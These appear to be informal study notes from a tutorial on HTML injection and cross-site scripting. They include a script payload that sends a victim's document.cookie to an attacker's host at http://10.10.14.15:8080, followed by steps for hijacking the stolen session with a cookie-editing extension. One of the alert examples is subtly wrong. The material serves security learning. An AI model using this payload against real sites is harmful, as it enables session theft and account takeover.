# HTML #

Is easy to understand, on some text-input sometimes you can put html code and the website can interpret it.

note the marquee label of html is very interesting. It will displace the text

```
<marquee> This will displace from his site </marquee>
```



So if the input text can interpret labels of html, it can interpret the javascript label. He is saying that this is XSS

```
<script>alert("this is an alert") </script>
```

He installed "edit this cookie" and he added to the chrome navigator.

He shows now his actual cookie session
```
<script>alert("document.cookie") </script>
```
He said that this is useful because you can steal session cookies

He doesnt want to the victim watched an emergent window showing his cookie, so here we are going to see another concept

# XSS BLIND #

For example, he will try to send the cookie session to a python local server
```
<script>document.write('<img src="http://10.10.14.15:8080/cds.jpg?cookie=' + document.cookie +'">')</script>
```

He will try to charge some image(that it doesnt exists)

## We will recive the cookie on the python server ##

And with the tool "edit this cookie" we can hijack the cookie session of the person that interacts with our website